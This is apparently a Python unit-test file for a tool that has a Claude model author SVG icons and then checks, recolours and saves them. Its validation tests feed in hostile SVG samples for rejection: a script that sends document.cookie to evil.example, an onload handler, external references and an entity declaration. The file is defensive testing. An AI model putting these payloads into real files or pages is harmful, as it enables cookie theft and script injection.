"""Tests for devgraphics.glyphs. No network: _http is monkeypatched throughout."""

import json
import os
import shutil
import tempfile
import unittest

from devgraphics import _http, glyphs
from devgraphics.backends import base

GOOD_SVG = (
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" '
    'stroke="#FF6A00" stroke-width="2" stroke-linecap="round" '
    'stroke-linejoin="round">'
    '<path d="M4 12.5 L9.5 18 L20 6.5"/></svg>'
)


def message(svg=GOOD_SVG, view_box="0 0 24 24", stop_reason="end_turn",
            stop_details=None):
    """A Messages response of the documented shape, thinking block and all."""
    return {
        "id": "msg_01XFDUDYJgAACzvnptvVoYEL",
        "type": "message",
        "role": "assistant",
        "model": "claude-opus-5",
        "content": [
            {"type": "thinking", "thinking": ""},
            {"type": "text",
             "text": json.dumps({"svg": svg, "viewBox": view_box})},
        ],
        "stop_reason": stop_reason,
        "stop_details": stop_details,
        "usage": {"input_tokens": 412, "output_tokens": 287},
    }


class Recorder(object):
    """Stands in for _http.request_json and remembers what it was handed."""

    def __init__(self, *responses):
        self.responses = list(responses)
        self.calls = []

    def __call__(self, url, payload=None, headers=None, **kwargs):
        self.calls.append({"url": url, "payload": payload, "headers": headers,
                           "kwargs": kwargs})
        return self.responses.pop(0) if self.responses else message()


def boom(*args, **kwargs):
    raise AssertionError("the network was touched")


class GlyphTestCase(unittest.TestCase):

    def patch(self, fake):
        original = _http.request_json
        _http.request_json = fake
        self.addCleanup(setattr, _http, "request_json", original)
        return fake

    def tempdir(self):
        path = tempfile.mkdtemp(prefix="devgraphics-glyphs-")
        self.addCleanup(shutil.rmtree, path, True)
        return path


class TestRequest(GlyphTestCase):

    def test_request_body_and_headers(self):
        http = self.patch(Recorder())
        glyphs.author({"check": "a check mark"}, api_key="sk-ant-test", log=lambda *a: None)

        self.assertEqual(len(http.calls), 1)
        call = http.calls[0]
        self.assertEqual(call["url"], "https://api.anthropic.com/v1/messages")
        self.assertEqual(call["headers"], {"x-api-key": "sk-ant-test",
                                           "anthropic-version": "2023-06-01"})

        body = call["payload"]
        self.assertEqual(body["model"], "claude-opus-5")
        self.assertEqual(body["max_tokens"], 4096)
        self.assertEqual(body["messages"],
                         [{"role": "user", "content": body["messages"][0]["content"]}])
        self.assertEqual(body["messages"][0]["role"], "user")
        self.assertIn("check mark", body["messages"][0]["content"])
        self.assertEqual(body["output_config"], {
            "effort": "high",
            "format": {
                "type": "json_schema",
                "schema": {
                    "type": "object",
                    "properties": {"svg": {"type": "string"},
                                   "viewBox": {"type": "string"}},
                    "required": ["svg", "viewBox"],
                    "additionalProperties": False,
                },
            },
        })

    def test_removed_parameters_are_never_sent(self):
        # temperature/top_p/top_k are a 400 on these models, and there is no seed.
        http = self.patch(Recorder())
        glyphs.author({"check": "a check mark"}, api_key="k", log=lambda *a: None)
        body = http.calls[0]["payload"]
        for name in ("temperature", "top_p", "top_k", "seed", "thinking"):
            self.assertNotIn(name, body)

    def test_system_prompt_carries_the_design_system(self):
        carbon = GOOD_SVG.replace('viewBox="0 0 24 24"', 'viewBox="0 0 32 32"')
        http = self.patch(Recorder(message(svg=carbon, view_box="0 0 32 32")))
        glyphs.author({"check": "a check mark"}, style="carbon-32",
                      api_key="k", log=lambda *a: None)
        system = http.calls[0]["payload"]["system"]
        self.assertIn('viewBox "0 0 32 32"', system)
        self.assertIn("stroke-width 2", system)
        self.assertIn("currentColor", system)


class TestResponse(GlyphTestCase):

    def test_response_becomes_a_written_glyph(self):
        self.patch(Recorder(message()))
        out = self.tempdir()
        records = glyphs.author({"check": "a check mark"}, api_key="k",
                                outdir=out, log=lambda *a: None)

        path = os.path.join(out, "check.svg")
        self.assertTrue(os.path.exists(path))
        with open(path, "r", encoding="utf-8") as fh:
            written = fh.read()
        self.assertIn("<svg", written)
        self.assertIn('viewBox="0 0 24 24"', written)
        self.assertIn("http://www.w3.org/2000/svg", written)

        record = records["check"]
        self.assertEqual(record["source"], "hand")
        self.assertEqual(record["model"], "claude-opus-5")
        self.assertEqual(record["style"], "material-24")
        self.assertEqual(record["path"], path)
        self.assertFalse(record["reproducible"])
        self.assertFalse(record["kept"])
        self.assertEqual(len(record["sha256"]), 64)
        self.assertEqual(record["bytes"], len(record["svg"].encode("utf-8")))

    def test_refusal_is_moderation_blocked(self):
        self.patch(Recorder(dict(message(), stop_reason="refusal",
                                 stop_details={"type": "refusal",
                                               "category": "cyber",
                                               "explanation": "no"})))
        with self.assertRaises(base.ModerationBlocked):
            glyphs.author({"check": "a check mark"}, api_key="k", log=lambda *a: None)

    def test_truncated_response_is_rejected(self):
        self.patch(Recorder(dict(message(), stop_reason="max_tokens")))
        with self.assertRaises(glyphs.GlyphRejected) as caught:
            glyphs.author({"check": "a check mark"}, api_key="k", log=lambda *a: None)
        self.assertIn("max_tokens", str(caught.exception))


class TestValidation(GlyphTestCase):
    """Untrusted model output, checked before anything reaches the disk."""

    def reject(self, svg, style=None):
        self.patch(boom)
        with self.assertRaises(glyphs.GlyphRejected) as caught:
            glyphs.validate(svg, style)
        return str(caught.exception)

    def test_script_is_rejected(self):
        message_ = self.reject(
            '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">'
            '<script>fetch("//evil.example/"+document.cookie)</script>'
            '<path d="M4 12 L9 18 L20 6"/></svg>')
        self.assertIn("script", message_)

    def test_missing_viewbox_is_rejected(self):
        self.assertIn("viewBox", self.reject(
            '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24">'
            '<path d="M4 12 L9 18 L20 6"/></svg>'))

    def test_wrong_canvas_is_rejected(self):
        self.assertIn("canvas", self.reject(
            '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">'
            '<path d="M4 12 L9 18 L20 6"/></svg>'))

    def test_image_and_foreignobject_are_rejected(self):
        for element in ('<image href="https://evil.example/a.png"/>',
                        '<foreignObject><b>hi</b></foreignObject>'):
            self.assertIn("not allowed", self.reject(
                '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">'
                '%s</svg>' % element))

    def test_external_reference_is_rejected(self):
        self.assertIn("leaves the document", self.reject(
            '<svg xmlns="http://www.w3.org/2000/svg" '
            'xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24">'
            '<use xlink:href="https://evil.example/sprite.svg#x"/></svg>'))

    def test_external_url_paint_is_rejected(self):
        self.assertIn("external url()", self.reject(
            '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">'
            '<path fill="url(https://evil.example/p.svg#g)" d="M0 0"/></svg>'))

    def test_event_handler_is_rejected(self):
        self.assertIn("event handler", self.reject(
            '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">'
            '<path onload="alert(1)" d="M4 12 L9 18 L20 6"/></svg>'))

    def test_entity_declaration_is_rejected(self):
        self.assertIn("ENTITY", self.reject(
            '<!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa">]>'
            '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">'
            '<path d="&a;"/></svg>'))

    def test_malformed_xml_is_rejected(self):
        self.assertIn("well-formed", self.reject(
            '<svg viewBox="0 0 24 24"><path d="M0 0"></svg>'))

    def test_non_svg_root_is_rejected(self):
        self.assertIn("not svg", self.reject(
            '<html><body>here is your icon</body></html>'))

    def test_claimed_viewbox_must_match_what_was_drawn(self):
        self.patch(Recorder(message(view_box="0 0 32 32")))
        with self.assertRaises(glyphs.GlyphRejected) as caught:
            glyphs.author({"check": "a check mark"}, api_key="k", log=lambda *a: None)
        self.assertIn("drew on", str(caught.exception))


class TestColour(GlyphTestCase):

    def test_currentcolor_replaces_a_literal_colour(self):
        self.patch(boom)
        out = glyphs.recolour(glyphs.validate(GOOD_SVG))
        self.assertIn('stroke="currentColor"', out)
        self.assertNotIn("#FF6A00", out)
        self.assertIn('fill="none"', out)      # none is paint-free, left alone

    def test_palette_overrides_currentcolor(self):
        self.patch(boom)
        out = glyphs.recolour(glyphs.validate(GOOD_SVG), palette="#0D0D0D")
        self.assertIn('stroke="#0D0D0D"', out)
        self.assertNotIn("currentColor", out)

    def test_style_attribute_is_dropped(self):
        self.patch(boom)
        svg = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">'
               '<path style="fill:#f00" fill="#f00" d="M0 0"/></svg>')
        out = glyphs.recolour(glyphs.validate(svg))
        self.assertNotIn("#f00", out)
        self.assertNotIn("style=", out)

    def test_missing_namespace_is_restored(self):
        self.patch(boom)
        svg = '<svg viewBox="0 0 24 24"><path fill="#000" d="M0 0"/></svg>'
        out = glyphs.recolour(glyphs.validate(svg))
        self.assertIn('xmlns="http://www.w3.org/2000/svg"', out)


class TestOverwrite(GlyphTestCase):

    def existing(self):
        out = self.tempdir()
        path = os.path.join(out, "check.svg")
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write("<!-- reviewed and committed -->\n")
        return out, path

    def test_existing_glyph_is_kept_and_costs_nothing(self):
        self.patch(boom)                      # a request here is a test failure
        out, path = self.existing()
        records = glyphs.author({"check": "a check mark"}, api_key="k",
                                outdir=out, log=lambda *a: None)
        with open(path, "r", encoding="utf-8") as fh:
            self.assertIn("reviewed and committed", fh.read())
        self.assertTrue(records["check"]["kept"])
        self.assertIsNone(records["check"]["model"])
        self.assertEqual(records["check"]["source"], "hand")

    def test_force_re_authors(self):
        http = self.patch(Recorder())
        out, path = self.existing()
        glyphs.author({"check": "a check mark"}, api_key="k", outdir=out,
                      force=True, log=lambda *a: None)
        self.assertEqual(len(http.calls), 1)
        with open(path, "r", encoding="utf-8") as fh:
            self.assertIn("<svg", fh.read())


class TestOptions(GlyphTestCase):

    def test_unknown_option_raises(self):
        self.patch(boom)
        with self.assertRaises(base.UnsupportedOption) as caught:
            glyphs.author({"check": "a check mark"}, api_key="k", pallete="#fff")
        self.assertIn("pallete", str(caught.exception))

    def test_unknown_style_raises(self):
        self.patch(boom)
        with self.assertRaises(base.UnsupportedOption):
            glyphs.resolve_style("material-16")

    def test_accepted_options_reach_the_request(self):
        http = self.patch(Recorder())
        glyphs.author({"check": "a check mark"}, api_key="k", max_tokens=1024,
                      effort="xhigh", log=lambda *a: None)
        body = http.calls[0]["payload"]
        self.assertEqual(body["max_tokens"], 1024)
        self.assertEqual(body["output_config"]["effort"], "xhigh")

    def test_missing_key_is_an_auth_error(self):
        self.patch(boom)
        saved = os.environ.pop("ANTHROPIC_API_KEY", None)
        if saved is not None:
            self.addCleanup(os.environ.__setitem__, "ANTHROPIC_API_KEY", saved)
        with self.assertRaises(base.AuthError):
            glyphs.author({"check": "a check mark"})


class TestOffline(GlyphTestCase):
    """Everything answerable with the server switched off, answerable offline."""

    def test_styles_and_validation_need_no_network(self):
        self.patch(boom)
        self.assertEqual(glyphs.resolve_style(None).name, "material-24")
        self.assertEqual(glyphs.resolve_style("carbon-32").canvas, 32.0)
        self.assertEqual(sorted(glyphs.STYLES), ["carbon-32", "material-24"])
        self.assertIn("currentColor",
                      glyphs.recolour(glyphs.validate(GOOD_SVG)))
        self.assertEqual(glyphs.author({}, api_key="k"), {})

    def test_glyphs_is_not_a_backend(self):
        # Anthropic has no image generation, so nothing here may be selectable
        # with --backend.
        for name, target in base.BUILTIN.items():
            self.assertNotIn("glyphs", target)
            self.assertNotIn("claude", name)
            self.assertNotIn("anthropic", name)


class TestProbe(GlyphTestCase):

    def test_probe_does_not_author_a_glyph(self):
        http = self.patch(Recorder({"id": "msg_probe", "content": [],
                                    "stop_reason": "max_tokens"}))
        ok, note = glyphs.probe(api_key="k")
        self.assertTrue(ok)
        self.assertIn("msg_probe", note)
        body = http.calls[0]["payload"]
        self.assertNotIn("output_config", body)     # no SVG schema, no glyph
        self.assertEqual(body["max_tokens"], 16)

    def test_probe_reports_a_missing_key_without_calling(self):
        self.patch(boom)
        saved = os.environ.pop("ANTHROPIC_API_KEY", None)
        if saved is not None:
            self.addCleanup(os.environ.__setitem__, "ANTHROPIC_API_KEY", saved)
        ok, note = glyphs.probe()
        self.assertFalse(ok)
        self.assertIn("ANTHROPIC_API_KEY", note)

    def test_probe_maps_a_dead_key(self):
        def unauthorised(*args, **kwargs):
            raise base.AuthError("HTTP 401: invalid x-api-key")
        self.patch(unauthorised)
        ok, note = glyphs.probe(api_key="k")
        self.assertFalse(ok)
        self.assertIn("401", note)


if __name__ == "__main__":
    unittest.main()
